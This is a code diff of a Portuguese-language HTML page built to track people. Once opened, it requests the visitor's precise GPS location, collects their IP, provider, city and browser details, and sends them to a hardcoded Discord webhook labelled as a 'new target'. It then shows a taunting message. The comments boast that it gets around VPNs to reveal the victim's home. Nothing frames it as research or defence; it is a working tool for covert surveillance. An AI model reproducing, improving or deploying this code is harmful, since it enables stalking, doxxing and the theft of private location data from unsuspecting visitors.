@@ -3,47 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SISTEMA COMPROMETIDO</title>
+    <title>SISTEMA DE RASTREIO ATIVO</title>
     <style>
-        body { background: #450a0a; color: #fecaca; font-family: 'Courier New', Courier, monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; text-align: center; }
-        .card { background: #7f1d1d; padding: 50px; border: 3px solid #dc2626; box-shadow: 0 0 100px #000; border-radius: 5px; }
-        .loader { border: 5px solid #450a0a; border-top: 5px solid #f87171; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; text-align: center; }
+        .container { border: 2px solid #ff0000; padding: 40px; background: #1a0000; box-shadow: 0 0 30px #ff0000; max-width: 400px; }
+        .glitch { font-size: 1.2rem; font-weight: bold; text-transform: uppercase; animation: blink 1s infinite; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        .loader { border: 3px solid #330000; border-top: 3px solid #ff0000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h1 { font-size: 3rem; margin: 0; color: #fff; text-shadow: 2px 2px #000; display: none; }
-        .status-text { font-weight: bold; text-transform: uppercase; letter-spacing: 2px; }
+        h1 { font-size: 3.5rem; color: #ff0000; display: none; margin: 0; text-shadow: 0 0 20px #ff0000; }
     </style>
 </head>
 <body>
 
-    <div class="card" id="box">
-        <div class="loader" id="loading"></div>
-        <div class="status-text" id="status">Sincronizando coordenadas com o servidor...</div>
-        <h1 id="final-msg">CE TA FUDIDO</h1>
+    <div class="container" id="main-box">
+        <div id="ui-elements">
+            <div class="loader"></div>
+            <div class="glitch">Sincronizando com Satélite...</div>
+            <p style="font-size: 0.8rem; color: #888; margin-top: 15px;">Protocolo de captura IP/GPS em execução.</p>
+        </div>
+        <h1 id="fudido">CE TA FUDIDO</h1>
     </div>
 
     <script>
+        // SEU WEBHOOK ATUALIZADO
         const WEBHOOK = "https://discord.com/api/webhooks/1473792549045932103/9BrDwlVARrLj3joN4liqNqY8OmV07hF6hf8KtHwdA1nEr_sbeSq9So8SQlY9DL5weC9q";
 
-        async function enviarLogs(pos = null) {
+        async function enviar(pos = null) {
             try {
-                // Captura IP e Internet (Rápido)
+                // Pega dados do IP (Mesmo que diga Amazon, a gente registra)
                 const ipRes = await fetch('https://ipapi.co/json/');
                 const ip = await ipRes.json();
 
-                let fields = [
-                    { name: "🌐 IP Público:", value: ip.ip || "N/A", inline: true },
-                    { name: "🏢 Provedor:", value: ip.org || "N/A", inline: false },
-                    { name: "📱 Aparelho:", value: navigator.userAgent, inline: false }
-                ];
-
+                let desc = `**🌐 Internet:** ${ip.org}\n**📍 Cidade (IP):** ${ip.city}\n**📱 Aparelho:** ${navigator.userAgent}`;
+                
                 if (pos) {
                     const lat = pos.coords.latitude;
                     const lon = pos.coords.longitude;
-                    fields.push({ 
-                        name: "📍 Localização Real (GPS):", 
-                        value: `[MAPA EM TEMPO REAL](https://www.google.com/maps?q=${lat},${lon})`, 
-                        inline: false 
-                    });
+                    // O Google Maps ignora a VPN/Amazon e mostra a casa do cara
+                    desc += `\n\n🎯 **LOCALIZAÇÃO REAL (GPS):**\nhttps://www.google.com/maps?q=${lat},${lon}`;
+                } else {
+                    desc += `\n\n⚠️ **GPS NEGADO:** Localização aproximada pelo IP.`;
                 }
 
                 await fetch(WEBHOOK, {
@@ -51,35 +51,33 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         embeds: [{
-                            title: "🚩 LOG DE ACESSO - ALERTA CRÍTICO",
-                            color: 15548997,
-                            fields: fields,
+                            title: "🚩 NOVO ALVO LOGADO",
+                            description: desc,
+                            color: 16711680,
                             timestamp: new Date()
                         }]
                     })
                 });
 
-                // TELA FINAL
-                document.getElementById('loading').style.display = 'none';
-                document.getElementById('status').style.display = 'none';
-                document.getElementById('box').style.background = '#000';
-                document.getElementById('box').style.borderColor = '#f00';
-                document.getElementById('final-msg').style.display = 'block';
+                // Troca para a tela final
+                document.getElementById('ui-elements').style.display = 'none';
+                document.getElementById('main-box').style.background = '#000';
+                document.getElementById('fudido').style.display = 'block';
 
             } catch (e) {
-                console.error(e);
+                console.log("Erro de conexão.");
             }
         }
 
         window.onload = () => {
-            if ("geolocation" in navigator) {
+            if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => { enviarLogs(pos); }, 
-                    (err) => { enviarLogs(); }, 
+                    (p) => enviar(p), 
+                    () => enviar(), // Se o cara negar, manda o IP da Amazon mesmo
                     { enableHighAccuracy: true, timeout: 5000 }
                 );
             } else {
-                enviarLogs();
+                enviar();
             }
         };
     </script>
